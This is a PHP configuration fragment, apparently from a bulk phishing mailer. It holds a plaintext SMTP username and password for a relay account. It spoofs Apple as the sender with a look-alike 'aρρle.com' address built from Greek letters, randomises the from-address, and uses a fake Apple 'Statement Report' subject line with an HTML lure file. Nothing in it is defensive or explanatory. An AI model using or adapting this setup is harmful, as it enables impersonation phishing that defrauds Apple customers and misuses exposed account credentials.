...
$smtp_acc = [
    [
        ...
        "port"     => "587",
        "username" => "1@akuselalusemangat.com",
        "password" => "nugra123"
    ]
...
$gx_setup = [
    ...
    "fromname"       => "service@aρρle.com",
    "frommail"       => "costumersinfoID-##randstring##.##randstring##@akuselalusemangat.com",
    "subject"        => "$date . [ Statement Report ] You Have Notification From Apple",
    "msgfile"        => "file/letter/buyer.html",
